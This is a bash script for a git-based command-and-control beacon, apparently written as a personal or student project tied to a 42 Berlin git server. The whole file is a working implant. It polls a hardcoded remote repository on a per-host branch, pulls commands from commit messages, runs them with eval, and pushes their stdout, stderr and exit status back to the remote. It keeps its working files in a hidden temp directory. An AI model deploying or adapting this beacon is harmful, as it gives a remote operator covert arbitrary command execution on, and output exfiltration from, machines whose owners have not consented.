#!/usr/bin/env bash
# Heavily uses bashisms, do not port to POSIX sh

log () {
	local level ansi

	level="${1}"
	shift
	case "${level}" in
		(critical) ansi="41;30" ;;
		(fatal) ansi="41;30" ;;
		(err) ansi="31" ;;
		(warn) ansi="33" ;;
		(info) ansi="34" ;;
		(debug) ansi="90" ;;
		(*) ansi="45;30" ;;
	esac
	printf "\033[${ansi}m%s: %s: %s: %s\033[m\n" "${0}" "${FUNCNAME[2]}" "${BASH_LINENO[1]}" "$*" >&2
}

critical () { log critical "${@}"; }
fatal () { log fatal "${@}"; }
err () { log err "${@}"; }
warn () { log warn "${@}"; }
info () { log info "${@}"; }
debug () { log debug "${@}"; }
_grey () { printf '\033[90m' >&2; }
_rst () { printf '\033[m' >&2; }

# Usage:
# if logif -1; then hide; fi # never show this specific diagnostic
# if logif 0; then debug; fi # show all diagnostics
# if logif 1; then info; fi
# if logif 2; then warning; fi
# if logif 3; then error; fi # only show error and fatal diagnostics
# if logif 4; then fatal; fi # only show fatal diagnostics
# if logif 999; then critical; fi # always this specific diagnostic
logif () {
	local required_loglevel

	required_loglevel="${1}"
	[ -n "${required_loglevel}" ] || required_loglevel="999" # if not providing a parameter, always log
	[ "${LOGLEVEL}" -le "${required_loglevel}" ]
}

# Remove temporary directory and cd back to a sane place
_cleanup () {
	printf '\n'
	if logif 0
	then
		logif 2 && warn "Cleaning up..."
		_grey
			cd /
			rm -rfv -- "${tmpdir}" |& xargs || { logif 3 && err "error deleting tmpdir"; }
			cd -- "${orig_dir}" || cd || cd -- "${HOME}" || cd -- ~ || pwd
		_rst
	fi
	logif 2 && warn "Exiting"
}

# Override git command to make it LOGLEVEL aware
git () {
	local subcomand
	declare -i status

	status="0"
	subcomand="${1}"
	[ -n "${subcomand}" ] || { command git; return 1; }
	shift
	if logif 0
	then
		_grey
			1>&2 command git "${subcomand}" "${@}" ; status="${?}"
		_rst
		return "${status}"
	else
		2>/dev/null 1>&2 command git "${subcomand}" "${@}" ; status="${?}"
		return "${status}"
	fi
}

_check_ref () {
	git ls-remote --heads --exit-code c2 -- "${1}"
}

# Returns empty string if there is no next command
_fetch_next_command () {
	local id_file cmd_id stdin

	id_file="${1}"

	_check_ref "${BEACON_ID}" \
		|| { logif 2 && warn "Pull failed (ref '${BEACON_ID}' doesnt exist)"; return 1; }
	git pull c2 -- "${BEACON_ID}" \
		|| { logif 2 && warn "Pull failed"; return 1; }
	cmd_id="$(comm -23 <(command git log --author=in --format=%ae | sort) <(command git log --author=out --format=%ae | sort) | sort -n | head -1)"
	[ -n "${cmd_id}" ] || return 1
	printf '%s' "${cmd_id}" 1>| "${id_file:-cmd_id}"
	stdin="$(command git log -1 --author="${cmd_id}" --format=%s ; printf .)" ; stdin="${stdin%.}"
	printf '%s' "${stdin}"
	logif 0 && debug "${cmd_id@A}"
}

_send_result () {
	local stdin stdout_file stderr_file status pipestatus elapsed id_file cmd_id

	stdin="${1}"
	stdout_file="${2}"
	stderr_file="${3}"
	status="${4}"
	pipestatus="${5}"
	elapsed="${6}"
	id_file="${7}"

	cmd_id="$(cat -- "${id_file:-cmd_id}")"

	printf '%s' "${status}" 1>| status
	printf '%s' "${pipestatus}" 1>| pipestatus
	printf '%s' "${elapsed}" 1>| elapsed

	git add --force "${stdout_file:-stdout}" "${stderr_file:-stderr}" status pipestatus elapsed "${id_file}"
	
	GIT_AUTHOR_NAME="out" GIT_AUTHOR_EMAIL="${cmd_id}" \
		git commit --allow-empty --message="${stdin}"

	git reset --hard
	git clean -df

	git push c2 -- "${BEACON_ID}" \
		|| { logif 2 && warn "Push failed"; return 1; }
}

# TODO: Make asynchronous, you don't want to lose the
# connection when you send a blocking/neverending command
_fetch_eval () {
	unset pipestatus
	local cmd status pipestatus elapsed

	cmd="$(_fetch_next_command cmd_id ; printf .)" ; cmd="${cmd%.}"
	[ -n "${cmd}" ] || return 1
	SECONDS="0"
	logif 1 && info "Executing: ${cmd@A}"
	eval "${cmd}"$'\npipestatus=("${PIPESTATUS[@]}")' 1>| stdout 2>| stderr
	status="${pipestatus[-1]}"
	elapsed="${SECONDS}"
	_send_result "${cmd}" stdout stderr "${status}" "${pipestatus[*]@A}" "${elapsed}" cmd_id
}

_is_valid_branch_name () {
	case "${1}" in
		(*[^abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._/-]*|"") false ;;
	esac
}

init () {
	trap _cleanup EXIT

	LOGLEVEL="$((LOGLEVEL + 0))"
	C2="git@vogsphere.42berlin.de:vogsphere/intra-uuid-17a60d50-65e8-4462-b546-c09f7a20c21c-5663399-tischmid"
	if _is_valid_branch_name "${1}"
	then
		BEACON_ID="${1}"
	else
		BEACON_ID="$(hostname -s)" || BEACON_ID="${HOSTNAME%%.*}"
		if ! _is_valid_branch_name "${BEACON_ID}"
		then
			logif 4 && fatal "error setting beacon id"
			exit 1
		fi
	fi
	POLL_RATE="5"
	unset CDPATH

	tmpdir="$(mktemp -d -p /tmp .gitc2beaconXXXXXXXXX)" || { logif 4 && fatal "error creating tmpdir"; exit 1; }
	orig_dir="$(pwd)" || { logif 3 && err "error saving original dir"; }
	cd -- "${tmpdir}" || { logif 4 && fatal "error changing to tmpdir"; exit 1; }

	git init
	git remote add c2 -- "${C2}"
	if _check_ref "${BEACON_ID}"
	then
		git pull c2 -- "${BEACON_ID}"
		git switch -- "${BEACON_ID}"
	elif _check_ref main
	then
		git pull c2 main
		git branch -- "${BEACON_ID}"
		git switch -- "${BEACON_ID}"
	else
		git branch --move -- "${BEACON_ID}"
	fi
	[ "$(command git branch --show-current)" = "${BEACON_ID}" ] || { logif 4 && fatal "Failed to be on '${BEACON_ID}' branch! Exiting"; exit 1; }
	if logif 0
	then
		_grey
			ls -al
			printf '%s\n' "${PWD@A}"
			printf '%s\n' "${C2@A}"
			printf '%s\n' "${BEACON_ID@A}"
			printf '%s\n' "${POLL_RATE@A}"
			printf '\n'
		_rst
	fi
}

loop () {
	while :
	do
		_fetch_eval
		logif 0 && debug "Waiting '${POLL_RATE}' seconds"
		sleep "${POLL_RATE}s"
	done
}

main () {
	init "${@}"
	loop
}

main "${@}"
